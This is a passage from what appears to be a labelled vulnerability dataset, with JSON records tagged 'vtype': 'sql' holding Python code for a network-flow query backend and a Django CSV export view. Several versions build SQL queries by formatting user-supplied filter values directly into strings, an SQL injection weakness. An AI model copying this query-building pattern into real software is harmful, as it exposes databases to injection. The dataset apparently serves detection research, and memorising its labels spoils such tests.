= name\n        self.display_name = display_name\n        self.type = 'text'\n        self.filter_string = None\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        if self.filter_string:\n            self.filter_string = self.filter_string + \"AND {2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n        else:\n            self.filter_string = \"{2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n\nclass IP4Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            self.filter_string = \"({0} << '{1}'\".format(self.name, value)\n        else:\n            self.filter_string = \"{0} = '{1}'\".format(self.name, value)\n\n        return self.filter_string\n\nclass IP6Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip6\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IntColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'int'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass PortColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'port'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = %s\".format(self.name, value)\n        return self.filter_string\n\nclass Coalesce:\n    def __init__(self, name, columns, filter_func, display_name):\n        \"\"\"\n        Coalesce\n        Select from a list of columns whatever is not null\n        :param columns (List): Column objects\n        \"\"\"\n        self.name = name\n        self.columns = columns\n        # We assume that the passed columns are of roughly the same type\n        self.type = columns[0].type\n        self.column_selects = []\n        for c in columns:\n            self.column_selects.append(c.select())\n\n        self.filter_string = None\n        self.filter_func = filter_func\n        self.display_name = display_name\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        fields = \", \".join(self.column_selects)\n        return \"COALESCE({0}) AS {1}\".format(fields, self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = self.filter_func(value, op)\n\nclass Schema:\n    \"\"\"\n    Schema\n\n    Defines the backend schema\n    Changes to the backend (naming, etc.) should be reflected here.\n    \"\"\"\n    def __init__(self):\n        # Default\n        self.limit = 10\n\n        self.column_order = [\n            \"last_switched\",\n            \"src_ip\",\n            \"src_port\",\n            \"dst_ip\",\n            \"dst_port\",\n            \"in_bytes\",\n        ]\n        src_ip_col = IP4Column(\"src_ip\", \"Source IP\")\n        src_ipv6_col = IP6Column(\"src_ipv6\", \"Source IPv6\")\n        dst_ip_col = IP4Column(\"dst_ip\", \"Destination IP\")\n        dst_ipv6_col = IP6Column(\"dst_ipv6\", \"DestinationIPv6\")\n\n        self.filter_val_list = []\n\n        # Columns\n        self.columns = {\n            \"last_switched\": Column(\"last_switched\", \"Last Switched\"),\n            \"src_ip\": Coalesce(\"src_c_ip\", [src_ip_col, src_ipv6_col], src_ip_col.filter, \"Source IP\"),\n            \"src_port\": PortColumn(\"src_port\", \"Source Port\"),\n            \"dst_ip\": Coalesce(\"dst_c_ip\", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, \"Destination IP\"),\n            \"dst_port\": PortColumn(\"dst_port\", \"Destination Port\"),\n            \"in_bytes\": IntColumn(\"in_bytes\", \"Input bytes\"),\n            \"in_pkts\": IntColumn(\"in_pkts\", \"Input Packets\"),\n        }\n\n        # Supported queries\n        self.QUERIES = {\n            \"TOPN\": self.topn\n        }\n\n        self.filters = []\n\n        self.filter_map = {\n            \"(\\d+\\-\\d+\\-\\d+)\": \"last_switched\",\n            \"src (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"src_ip\",\n            \"dst (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"dst_ip\",\n            \"src ([0-9]+)($|\\s)\": \"src_port\",\n            \"dst ([0-9]+)($|\\s)\": \"dst_port\",\n        }\n\n    def add_filter(self, value, op=\"=\"):\n        for regex, column in self.filter_map.items():\n            if re.search(regex, value):\n                m = re.search(regex, value)\n                v = m.group(1)\n                self.columns[column].filter(v, op)\n                self.filter_val_list.append(v)\n\n    def build_filter_string(self):\n        s = 'WHERE '\n        l = []\n        for c in self.columns.values():\n            if c.filter_string:\n                l.append(c.filter_string)\n\n        if len(l) > 0:\n            return s + \" AND \".join(l)\n        else:\n            return ''\n\n    def get_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            result[col_name] = col.get_display_name()\n\n        return result\n\n    def get_int_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            if col.type is \"int\":\n                result[col_name] = col.get_display_name()\n\n        return result\n\n    def topn(self, column):\n        count = \"last_switched\"\n        q = \"\"\"\n        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), count, self.build_filter_string())\n        return self.query_boilerplate(q)\n\n    def topn_sum(self, column, sum_by):\n        q = \"\"\"\n        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)\n        return self.query_boilerplate(q)\n\n    def flows(self):\n        c = []\n        for col in self.column_order:\n            c.append(self.columns[col].select())\n        q = \"\"\"\n        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC\n        \"\"\".format(self.build_filter_string(), \", \".join(c))\n        return self.query_boilerplate(q)\n\n    def query_boilerplate(self, q):\n        q = q + \"\"\"LIMIT {0}\"\"\".format(self.limit)\n        return q\n\n    def query(self, db, q):\n        cursor = db.cursor()\n        cursor.execute(q, self.filter_val_list)\n        return cursor/n/n/n", "label": 0, "vtype": "sql"}, {"id": "ef6a4d5639653ecfe27fd2335752fc98e7352075", "code": "/gfui/backends/Timescaledb/timescaledb.py/n/nfrom gfui.backends.default import Backend\nimport psycopg2\nfrom gfui.chartgraph import Graph, Table\nimport re\nimport ipaddress\nimport os\n\nclass Timescaledb_backend(Backend):\n    def __init__(self, OPTIONS):\n        super().__init__()\n        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']\n        self.parse_options(OPTIONS)\n        self.columns = {}\n\n        pw = os.environ.get(\"SQL_PASSWORD\")\n        if not pw:\n            pw = self.OPTIONS['SQL_PASSWORD']\n\n        self.db = psycopg2.connect(\n            \"dbname={0} user={1} password={2} host={3}\".format(\n                self.OPTIONS['SQL_DB'],\n                self.OPTIONS['SQL_USERNAME'],\n                pw,\n                self.OPTIONS['SQL_SERVER']\n            )\n        )\n\n        self.schema = Schema()\n\n        self.filters = []\n\n    def get_columns(self):\n        return self.schema.get_columns()\n\n    def add_filter(self, op, value):\n        self.schema.add_filter(value, op)\n\n    def get_int_columns(self):\n        return self.schema.get_int_columns()\n\n    def flow_table(self, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS = self.schema.flows()\n\n        cursor = db.cursor()\n        cursor.execute(FLOWS)\n        r = cursor.fetchall()\n        t = Table()\n        t = t.table_from_rows(r, self.schema.column_order)\n        return t\n\n    def topn_sum_graph(self, field, sum_by, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)\n\n        cursor = db.cursor()\n        cursor.execute(FLOWS_PER_IP)\n        r = cursor.fetchall()\n        g = Graph()\n        g.name = \"TopN {0}\".format(field)\n        g.set_headers([\n            field,\n            \"Total\"\n        ])\n        g.graph_from_rows(r, 0)\n        return g\n\nclass Column:\n    \"\"\"\n    Column\n\n    Column handling class.\n    Governs how query strings are built and helper functons for returned data.\n    \"\"\"\n    def __init__(self, name, display_name=None):\n        self.name = name\n        self.display_name = display_name\n        self.type = 'text'\n        self.filter_string = None\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        if self.filter_string:\n            self.filter_string = self.filter_string + \"AND {2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n        else:\n            self.filter_string = \"{2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n\nclass IP4Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            self.filter_string = \"({0} << '{1}'\".format(self.name, value)\n        else:\n            self.filter_string = \"{0} = '{1}'\".format(self.name, value)\n\n        return self.filter_string\n\nclass IP6Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip6\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IntColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'int'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass PortColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'port'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass Coalesce:\n    def __init__(self, name, columns, filter_func, display_name):\n        \"\"\"\n        Coalesce\n        Select from a list of columns whatever is not null\n        :param columns (List): Column objects\n        \"\"\"\n        self.name = name\n        self.columns = columns\n        # We assume that the passed columns are of roughly the same type\n        self.type = columns[0].type\n        self.column_selects = []\n        for c in columns:\n            self.column_selects.append(c.select())\n\n        self.filter_string = None\n        self.filter_func = filter_func\n        self.display_name = display_name\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        fields = \", \".join(self.column_selects)\n        return \"COALESCE({0}) AS {1}\".format(fields, self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = self.filter_func(value, op)\n\nclass Schema:\n    \"\"\"\n    Schema\n\n    Defines the backend schema\n    Changes to the backend (naming, etc.) should be reflected here.\n    \"\"\"\n    def __init__(self):\n        # Default\n        self.limit = 10\n\n        self.column_order = [\n            \"last_switched\",\n            \"src_ip\",\n            \"src_port\",\n            \"dst_ip\",\n            \"dst_port\",\n            \"in_bytes\",\n        ]\n        src_ip_col = IP4Column(\"src_ip\", \"Source IP\")\n        src_ipv6_col = IP6Column(\"src_ipv6\", \"Source IPv6\")\n        dst_ip_col = IP4Column(\"dst_ip\", \"Destination IP\")\n        dst_ipv6_col = IP6Column(\"dst_ipv6\", \"DestinationIPv6\")\n\n        # Filter tuples are filter values\n        self.filter_tuples = ()\n\n        # Columns\n        self.columns = {\n            \"last_switched\": Column(\"last_switched\", \"Last Switched\"),\n            \"src_ip\": Coalesce(\"src_c_ip\", [src_ip_col, src_ipv6_col], src_ip_col.filter, \"Source IP\"),\n            \"src_port\": PortColumn(\"src_port\", \"Source Port\"),\n            \"dst_ip\": Coalesce(\"dst_c_ip\", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, \"Destination IP\"),\n            \"dst_port\": PortColumn(\"dst_port\", \"Destination Port\"),\n            \"in_bytes\": IntColumn(\"in_bytes\", \"Input bytes\"),\n            \"in_pkts\": IntColumn(\"in_pkts\", \"Input Packets\"),\n        }\n\n        # Supported queries\n        self.QUERIES = {\n            \"TOPN\": self.topn\n        }\n\n        self.filters = []\n\n        self.filter_map = {\n            \"(\\d+\\-\\d+\\-\\d+)\": \"last_switched\",\n            \"src (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"src_ip\",\n            \"dst (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"dst_ip\",\n            \"src ([0-9]+)($|\\s)\": \"src_port\",\n            \"dst ([0-9]+)($|\\s)\": \"dst_port\",\n        }\n\n    def add_filter(self, value, op=\"=\"):\n        for regex, column in self.filter_map.items():\n            if re.search(regex, value):\n                m = re.search(regex, value)\n                v = m.group(1)\n                self.columns[column].filter(v, op)\n\n    def build_filter_string(self):\n        s = 'WHERE '\n        l = []\n        for c in self.columns.values():\n            if c.filter_string:\n                l.append(c.filter_string)\n\n        if len(l) > 0:\n            return s + \" AND \".join(l)\n        else:\n            return ''\n\n    def get_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            result[col_name] = col.get_display_name()\n\n        return result\n\n    def get_int_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            if col.type is \"int\":\n                result[col_name] = col.get_display_name()\n\n        return result\n\n    def topn(self, column):\n        count = \"last_switched\"\n        q = \"\"\"\n        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), count, self.build_filter_string())\n        return self.query_boilerplate(q)\n\n    def topn_sum(self, column, sum_by):\n        q = \"\"\"\n        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)\n        return self.query_boilerplate(q)\n\n    def flows(self):\n        c = []\n        for col in self.column_order:\n            c.append(self.columns[col].select())\n        q = \"\"\"\n        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC\n        \"\"\".format(self.build_filter_string(), \", \".join(c))\n        return self.query_boilerplate(q)\n\n    def query_boilerplate(self, q):\n        q = q + \"\"\"LIMIT {0}\"\"\".format(self.limit)\n        return q\n\n    def query(self, db, q):\n        cursor = db.cursor()\n        cursor.execute(q, self.filter_tuples)/n/n/n", "label": 1, "vtype": "sql"}, {"id": "307587cc00d2290a433bf74bd305aecffcbb05a2", "code": "wins/views/flat_csv.py/n/nimport collections\nimport csv\nimport functools\nimport io\nimport zipfile\nfrom operator import attrgetter\nimport mimetypes\n\nfrom django.conf import settings\nfrom django.core.exceptions import ValidationError\nfrom django.db import connection, models\nfrom django.http import HttpResponse, StreamingHttpResponse\nfrom django.utils.decorators import method_decorator\nfrom django.utils.timezone import now\nfrom django.views.decorators.gzip import gzip_page\n\nfrom rest_framework import permissions\nfrom rest_framework.views import APIView\n\nfrom alice.authenticators import IsDataTeamServer\nfrom ..constants import BREAKDOWN_TYPES\nfrom ..models import Advisor, Breakdown, CustomerResponse, Notification, Win\nfrom ..serializers import CustomerResponseSerializer, WinSerializer\nfrom users .models import User\n\n\nclass CSVView(APIView):\n    \"\"\" Endpoint returning CSV of all Win data, with foreign keys flattened \"\"\"\n\n    permission_classes = (permissions.IsAdminUser,)\n    # cache for speed\n    win_fields = WinSerializer().fields\n    customerresponse_fields = CustomerResponseSerializer().fields\n    IGNORE_FIELDS = ['responded', 'sent', 'country_name', 'updated',\n                     'complete', 'type', 'type_display',\n                     'export_experience_display', 'location']\n\n    def __init__(self, **kwargs):\n        # cache some stuff to make flat CSV. like prefetch but works easily\n        # with .values()\n        self.users_map = {u.id: u for u in User.objects.all()}\n        prefetch_tables = [\n            ('advisors', Advisor),\n            ('breakdowns', Breakdown),\n            ('confirmations', CustomerResponse),\n            ('notifications', Notification),\n        ]\n        self.table_maps = {}\n        for table, model in prefetch_tables:\n            prefetch_map = collections.defaultdict(list)\n            instances = model.objects.all()\n            if table == 'notifications':\n                instances = instances.filter(type='c').order_by('created')\n            for instance in instances:\n                prefetch_map[instance.win_id].append(instance)\n            self.table_maps[table] = prefetch_map\n        super().__init__(**kwargs)\n\n    def _extract_breakdowns(self, win):\n        \"\"\" Return list of 10 tuples, 5 for export, 5 for non-export \"\"\"\n\n        breakdowns = self.table_maps['breakdowns'][win['id']]\n        retval = []\n        for db_val, name in BREAKDOWN_TYPES:\n\n            # get breakdowns of given type sorted by year\n            type_breakdowns = [b for b in breakdowns if b.type == db_val]\n            type_breakdowns = sorted(type_breakdowns, key=attrgetter('year'))\n\n            # we currently solicit 5 years worth of breakdowns, but historic\n            # data may have no input for some years\n            for index in range(5):\n                try:\n                    breakdown = \"{0}: \u00a3{1:,}\".format(\n                        type_breakdowns[index].year,\n                        type_breakdowns[index].value,\n                    )\n                except IndexError:\n                    breakdown = None\n\n                retval.append((\n                    \"{0} breakdown {1}\".format(name, index + 1),\n                    breakdown,\n                ))\n\n        return retval\n\n    def _confirmation(self, win):\n        \"\"\" Add fields for confirmation \"\"\"\n\n        if win['id'] in self.table_maps['confirmations']:\n            confirmation = self.table_maps['confirmations'][win['id']][0]\n        else:\n            confirmation = None\n\n        values = [\n            ('customer response recieved',\n             self._val_to_str(bool(confirmation)))\n        ]\n        for field_name in self.customerresponse_fields:\n            if field_name in ['win']:\n                continue\n\n            model_field = self._get_customerresponse_field(field_name)\n            if confirmation:\n                if model_field.choices:\n                    display_fn = getattr(\n                        confirmation, \"get_{0}_display\".format(field_name)\n                    )\n                    value = display_fn()\n                else:\n                    value = getattr(confirmation, field_name)\n            else:\n                value = ''\n\n            model_field_name = model_field.verbose_name or model_field.name\n            if model_field_name == 'created':\n                csv_field_name = 'date response received'\n                if value:\n                    value = value.date()  # just want date\n            else:\n                csv_field_name = model_field_name\n\n            values.append((csv_field_name, self._val_to_str(value)))\n        return values\n\n    def _get_model_field(self, model, name):\n        return next(\n            filter(lambda field: field.name == name, model._meta.fields)\n        )\n\n    @functools.lru_cache(None)\n    def _get_customerresponse_field(self, name):\n        \"\"\" Get field specified in CustomerResponse model \"\"\"\n        return self._get_model_field(CustomerResponse, name)\n\n    @functools.lru_cache(None)\n    def _get_win_field(self, name):\n        \"\"\" Get field specified in Win model \"\"\"\n        return self._get_model_field(Win, name)\n\n    def _val_to_str(self, val):\n        if val is True:\n            return 'Yes'\n        elif val is False:\n            return 'No'\n        elif val is None:\n            return ''\n        else:\n            return str(val)\n\n    @functools.lru_cache(None)\n    def _choices_dict(self, choices):\n        return dict(choices)\n\n    def _get_win_data(self, win):\n        \"\"\" Take Win dict, return ordered dict of {name -> value} \"\"\"\n\n        # want consistent ordering so CSVs are always same format\n        win_data = collections.OrderedDict()\n\n        # local fields\n        for field_name in self.win_fields:\n            if field_name in self.IGNORE_FIELDS:\n                continue\n\n            model_field = self._get_win_field(field_name)\n            if field_name == 'user':\n                value = str(self.users_map[win['user_id']])\n            elif field_name == 'created':\n                value = win[field_name].date()  # don't care about time\n            elif field_name == 'cdms_reference':\n                # numeric cdms reference numbers should be prefixed with\n                # an apostrophe to make excel interpret them as text\n                value = win[field_name]\n                try:\n                    int(value)\n                except ValueError:\n                    pass\n                else:\n                    if value.startswith('0'):\n                        value = \"'\" + value\n            else:\n                value = win[field_name]\n            # if it is a choicefield, do optimized lookup of the display value\n            if model_field.choices and value:\n                try:\n                    value = self._choices_dict(model_field.choices)[value]\n                except KeyError as e:\n                    if model_field.attname == 'hvc':\n                        value = value\n                    else:\n                        raise e\n            else:\n                comma_fields = [\n                    'total_expected_export_value',\n                    'total_expected_non_export_value',\n                    'total_expected_odi_value',\n                ]\n                if field_name in comma_fields:\n                    value = \"\u00a3{:,}\".format(value)\n\n            model_field_name = model_field.verbose_name or model_field.name\n            win_data[model_field_name] = self._val_to_str(value)\n\n        # remote fields\n        win_data['contributing advisors/team'] = (\n            ', '.join(map(str, self.table_maps['advisors'][win['id']]))\n        )\n\n        # get customer email sent & date\n        notifications = self.table_maps['notifications'][win['id']]\n        # old Wins do not have notifications\n        email_sent = bool(notifications or win['complete'])\n        win_data['customer email sent'] = self._val_to_str(email_sent)\n        if notifications:\n            win_data['customer email date'] = str(\n                notifications[0].created.date())\n        elif win['complete']:\n            win_data['customer email date'] = '[manual]'\n        else:\n            win_data['customer email date'] = ''\n\n        win_data.update(self._extract_breakdowns(win))\n        win_data.update(self._confirmation(win))\n\n        return win_data\n\n    def _make_flat_wins_csv(self, deleted=False):\n        \"\"\" Make CSV of all Wins, with non-local data flattened \"\"\"\n\n        if deleted:\n            wins = Win.objects.inactive()\n        else:\n            wins = Win.objects.all()\n\n        if deleted:\n            # ignore users should show up in normal CSV\n            wins = wins.exclude(\n                user__email__in=settings.IGNORE_USERS\n            )\n\n        wins = wins.values()\n\n        win_datas = [self._get_win_data(win) for win in wins]\n        stringio = io.StringIO()\n        stringio.write(u'\\ufeff')\n        if win_datas:\n            csv_writer = csv.DictWriter(stringio, win_datas[0].keys())\n            csv_writer.writeheader()\n            for win_data in win_datas:\n                csv_writer.writerow(win_data)\n        return stringio.getvalue()\n\n    def _make_user_csv(self):\n        users = User.objects.all()\n        user_dicts = [\n            {'name': u.name, 'email': u.email, 'joined': u.date_joined}\n            for u in users\n        ]\n        stringio = io.StringIO()\n        csv_writer = csv.DictWriter(stringio, user_dicts[0].keys())\n        csv_writer.writeheader()\n        for user_dict in user_dicts:\n            csv_writer.writerow(user_dict)\n        return stringio.getvalue()\n\n    def _make_plain_csv(self, table):\n        \"\"\" Get CSV of table \"\"\"\n\n        stringio = io.StringIO()\n        cursor = connection.cursor()\n        cursor.execute(\"select * from wins_{};\".format(table))\n        csv_writer = csv.writer(stringio)\n        header = [i[0] for i in cursor.description]\n        csv_writer.writerow(header)\n        csv_writer.writerows(cursor)\n        return stringio.getvalue()\n\n    def get(self, request, format=None):\n        bytesio = io.BytesIO()\n        zf = zipfile.ZipFile(bytesio, 'w')\n        for table in ['customerresponse', 'notification', 'advisor']:\n            csv_str = self._make_plain_csv(table)\n            zf.writestr(table + 's.csv', csv_str)\n        full_csv_str = self._make_flat_wins_csv()\n        zf.writestr('wins_complete.csv', full_csv_str)\n        full_csv_del_str = self._make_flat_wins_csv(deleted=True)\n        zf.writestr('wins_deleted_complete.csv', full_csv_del_str)\n        user_csv_str = self._make_user_csv()\n        zf.writestr('users.csv', user_csv_str)\n        zf.close()\n        return HttpResponse(bytesio.getvalue(), content_type=mimetypes.types_map['.csv'])\n\n\nclass Echo(object):\n    \"\"\"An object that implements just the write method of the file-like\n    interface.\n    \"\"\"\n\n    def write(self, value):\n        \"\"\"Write the value by returning it, instead of storing in a buffer.\"\"\"\n        return value\n\n\n@method_decorator(gzip_page, name='dispatch')\nclass CompleteWinsCSVView(CSVView):\n\n    permission_classes = (IsDataTeamServer,)\n\n    def _make_flat_wins_csv(self, deleted=False):\n        \"\"\" Make CSV of all Wins, with non-local data flattened \"\"\"\n\n        if deleted:\n            wins = Win.objects.inactive()\n        else:\n            wins = Win.objects.all()\n\n        if deleted:\n            # ignore users should show up in normal CSV\n            wins = wins.exclude(\n                user__email__in=settings.IGNORE_USERS\n            )\n\n        wins = wins.values()\n\n        for win in wins:\n            yield self._get_win_data(win)\n\n    def _make_flat_wins_csv_stream(self, win_data_generator):\n        stringio = Echo()\n        yield stringio.write(u'\\ufeff')\n        first = next(win_data_generator)\n        csv_writer = csv.DictWriter(stringio, first.keys())\n        header = dict(zip(first.keys(), first.keys()))\n        yield csv_writer.writerow(header)\n        yield csv_writer.writerow(first)\n\n        for win_data in win_data_generator:\n            yield csv_writer.writerow(win_data)\n\n    def streaming_response(self, filename):\n        resp = StreamingHttpResponse(\n            self._make_flat_wins_csv_stream(self._make_flat_wins_csv()),\n            content_type=mimetypes.types_map['.csv'],\n        )\n        resp['Content-Disposition'] = f'attachent; filename={filename}'\n        return resp\n\n    def get(self, request, format=None):\n        return self.streaming_response(f'wins_complete_{now().isoformat()}.csv')\n\n\n@method_decorator(gzip_page, name='dispatch')\nclass CurrentFinancialYearWins(CompleteWinsCSVView):\n\n    # permission_classes = (permissions.IsAdminUser,)\n    end_date = None\n\n    def _make_flat_wins_csv(self, **kwargs):\n        \"\"\"\n        Make CSV of all completed Wins till now for this financial year, with non-local data flattened\n        remove all rows where:\n        1. total expected export value = 0 and total non export value = 0 and total odi value = 0\n        2. date created = today (not necessary if this task runs before end of the day for next day download)\n        3. customer email sent is False / No\n        4. Customer response received is not from this financial year\n        Note that this view removes win, notification and customer response entries\n        that might have been made inactive in duecourse\n        \"\"\"\n        with connection.cursor() as cursor:\n            if self.end_date:\n                cursor.execute(\"SELECT id FROM wins_completed_wins_fy where created <= %s\", (self.end_date,))\n            else:\n                cursor.execute(\"SELECT id FROM wins_completed_wins_fy\")\n            ids = cursor.fetchall()\n\n        wins = Win.objects.filter(id__in=[id[0] for id in ids]).values()\n\n        for win in wins:\n            yield self._get_win_data(win)\n\n    def get(self, request, format=None):\n        end_str = request.GET.get(\"end\", None)\n        if end_str:\n            try:\n                self.end_date = models.DateField().to_python(end_str)\n            except ValidationError:\n                self.end_date = None\n\n        return self.streaming_response(f'wins_current_fy_{now().isoformat()}.csv')\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "307587cc00d2290a433bf74bd305aecffcbb05a2", "code": "/wins/views/flat_csv.py/n/nimport collections\nimport csv\nimport functools\nimport io\nimport zipfile\nfrom operator import attrgetter\nimport mimetypes\n\nfrom django.conf import settings\nfrom django.core.exceptions import ValidationError\nfrom django.db import connection, models\nfrom django.http import HttpResponse, StreamingHttpResponse\nfrom django.utils.decorators import method_decorator\nfrom django.utils.timezone import now\nfrom django.views.decorators.gzip import gzip_page\n\nfrom rest_framework import permissions\nfrom rest_framework.views import APIView\n\nfrom alice.authenticators import IsDataTeamServer\nfrom ..constants import BREAKDOWN_TYPES\nfrom ..models import Advisor, Breakdown, CustomerResponse, Notification, Win\nfrom ..serializers import CustomerResponseSerializer, WinSerializer\nfrom users .models import User\n\n\nclass CSVView(APIView):\n    \"\"\" Endpoint returning CSV of all Win data, with foreign keys flattened \"\"\"\n\n    permission_classes = (permissions.IsAdminUser,)\n    # cache for speed\n    win_fields = WinSerializer().fields\n    customerresponse_fields = CustomerResponseSerializer().fields\n    IGNORE_FIELDS = ['responded', 'sent', 'country_name', 'updated',\n                     'complete', 'type', 'type_display',\n                     'export_experience_display', 'location']\n\n    def __init__(self, **kwargs):\n        # cache some stuff to make flat CSV. like prefetch but works easily\n        # with .values()\n        self.users_map = {u.id: u for u in User.objects.all()}\n        prefetch_tables = [\n            ('advisors', Advisor),\n            ('breakdowns', Breakdown),\n            ('confirmations', CustomerResponse),\n            ('notifications', Notification),\n        ]\n        self.table_maps = {}\n        for table, model in prefetch_tables:\n            prefetch_map = collections.defaultdict(list)\n            instances = model.objects.all()\n            if table == 'notifications':\n                instances = instances.filter(type='c').order_by('created')\n            for instance in instances:\n                prefetch_map[instance.win_id].append(instance)\n            self.table_maps[table] = prefetch_map\n        super().__init__(**kwargs)\n\n    def _extract_breakdowns(self, win):\n        \"\"\" Return list of 10 tuples, 5 for export, 5 for non-export \"\"\"\n\n        breakdowns = self.table_maps['breakdowns'][win['id']]\n        retval = []\n        for db_val, name in BREAKDOWN_TYPES:\n\n            # get breakdowns of given type sorted by year\n            type_breakdowns = [b for b in breakdowns if b.type == db_val]\n            type_breakdowns = sorted(type_breakdowns, key=attrgetter('year'))\n\n            # we currently solicit 5 years worth of breakdowns, but historic\n            # data may have no input for some years\n            for index in range(5):\n                try:\n                    breakdown = \"{0}: \u00a3{1:,}\".format(\n                        type_breakdowns[index].year,\n                        type_breakdowns[index].value,\n                    )\n                except IndexError:\n                    breakdown = None\n\n                retval.append((\n                    \"{0} breakdown {1}\".format(name, index + 1),\n                    breakdown,\n                ))\n\n        return retval\n\n    def _confirmation(self, win):\n        \"\"\" Add fields for confirmation \"\"\"\n\n        if win['id'] in self.table_maps['confirmations']:\n            confirmation = self.table_maps['confirmations'][win['id']][0]\n        else:\n            confirmation = None\n\n        values = [\n            ('customer response recieved',\n             self._val_to_str(bool(confirmation)))\n        ]\n        for field_name in self.customerresponse_fields:\n            if field_name in ['win']:\n                continue\n\n            model_field = self._get_customerresponse_field(field_name)\n            if confirmation:\n                if model_field.choices:\n                    display_fn = getattr(\n                        confirmation, \"get_{0}_display\".format(field_name)\n                    )\n                    value = display_fn()\n                else:\n                    value = getattr(confirmation, field_name)\n            else:\n                value = ''\n\n            model_field_name = model_field.verbose_name or model_field.name\n            if model_field_name == 'created':\n                csv_field_name = 'date response received'\n                if value:\n                    value = value.date()  # just want date\n            else:\n                csv_field_name = model_field_name\n\n            values.append((csv_field_name, self._val_to_str(value)))\n        return values\n\n    def _get_model_field(self, model, name):\n        return next(\n            filter(lambda field: field.name == name, model._meta.fields)\n        )\n\n    @functools.lru_cache(None)\n    def _get_customerresponse_field(self, name):\n        \"\"\" Get field specified in CustomerResponse model \"\"\"\n        return self._get_model_field(CustomerResponse, name)\n\n    @functools.lru_cache(None)\n    def _get_win_field(self, name):\n        \"\"\" Get field specified in Win model \"\"\"\n        return self._get_model_field(Win, name)\n\n    def _val_to_str(self, val):\n        if val is True:\n            return 'Yes'\n        elif val is False:\n            return 'No'\n        elif 